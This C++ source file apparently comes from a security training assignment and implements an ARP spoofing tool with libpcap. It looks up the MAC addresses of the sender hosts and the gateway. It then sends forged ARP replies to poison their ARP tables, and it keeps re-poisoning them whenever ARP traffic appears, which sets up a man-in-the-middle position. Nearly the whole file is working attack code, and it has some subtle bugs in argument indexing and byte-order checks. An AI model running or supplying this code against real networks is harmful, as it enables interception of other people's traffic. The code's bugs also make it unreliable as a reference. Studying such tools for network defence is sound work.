#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "my_class.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

int send_arp_packet(int type, char* dev, Mac eth_dmac, Mac eth_smac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(eth_dmac);
    packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if(type == 1)
        packet.arp_.op_ = htons(ArpHdr::Request);
    else if (type==2)
        packet.arp_.op_ = htons(ArpHdr::Reply);
    else{
        printf("worng type error : [1]Request [2]Reply \n");
        return 1;
    }
    packet.arp_.smac_ = Mac(arp_smac);
    packet.arp_.sip_ = htonl(Ip(arp_sip));
    packet.arp_.tmac_ = Mac(arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arp_tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    return 0;
}

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> ... \n");
    printf("sample: send-arp-test wlan0 192.168.~.~ 192.168.~.~ \n");
}

struct Info
{
    Ip sender_ip;
    Mac sender_mac;
    Ip target_ip;
};

int main(int argc, char* argv[]) {

    char track[] = "개발";
    char name[] = "임창현";
    printf("[bob10][%s]send-arp[%s]\n", track, name);

    if (argc < 3) {
        usage();
        return -1;
    }

    // Take argv
    char* dev = argv[1];
    Mac what_mac = Mac::broadcastMac();
    Mac tmac = Mac::nullMac();
    Mac my_mac = Mac(getmac());
    Ip my_ip = Ip(getip(dev));
    Ip tip = Ip(argv[3]);

    // store argv values
    Info *sender_group = (Info*)malloc(sizeof(Info) * (argc-2));
    for(int i = 0; i < (argc - 2); i++) {
        sender_group[i].sender_ip = Ip(argv[i+2]);
        sender_group[i].target_ip = Ip(argv[i+3]);
    }

    send_arp_packet(1, dev, what_mac, my_mac, my_mac, my_ip, tmac, tip);
    Mac gateway_mac = receive_arp_reply(dev, tip);

    // Attack to Senders' ARP Table...
    for(int j = 0; j < (argc - 2); j++) {
        send_arp_packet(1, dev, what_mac, my_mac, my_mac, my_ip, tmac, sender_group[j].sender_ip);
        printf("Sended ARP Packet to Sender%d\n", j);

        sender_group[j].sender_mac = Mac(receive_arp_reply(dev, sender_group[j].sender_ip));
        printf("Sender%d's Mac Address is %s\n", j, ((std::string)sender_group[j].sender_mac).c_str());

        send_arp_packet(2, dev, sender_group[j].sender_mac, my_mac, my_mac, sender_group[j].target_ip, sender_group[j].sender_mac, sender_group[j].sender_ip);
        printf("Sended Arp Reply Packet to Sender%d\n", j);

        send_arp_packet(2, dev, gateway_mac, sender_group[j].sender_mac, my_mac, sender_group[j].sender_ip, gateway_mac, sender_group[j].target_ip);
        printf("Sended ARP Reply Packet to attack Target's ARP TABLE where is sender%d", j);
    }

    // Open Packet Handler
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    // Loop
    while(1) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("packet_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            continue;
        }

        struct EthHdr* eth_hdr = (struct EthHdr*)(packet);

        if (eth_hdr->type_ == 2054){        // If Packet is ARP Packet
            struct ArpHdr* arp_hdr = (struct ArpHdr*)(packet+14);
            for (int i = 0 ; i < (argc - 2) ; i ++) {
                if (eth_hdr->smac_ == sender_group[i].sender_mac){   // if source_mac is in the sender_group
                    send_arp_packet(2, dev, eth_hdr->smac_, my_mac, my_mac, sender_group[i].target_ip, eth_hdr->smac_, arp_hdr->sip_);
                    break;
                } else if (eth_hdr->smac_ == gateway_mac) {
                    send_arp_packet(1, dev, gateway_mac, sender_group[i].sender_mac, my_mac, sender_group[i].sender_ip, gateway_mac, tip);
                }
            }

        } else {                            // Not ARP Packet ( = To Relay)

        }

    }

    pcap_close(handle);
}
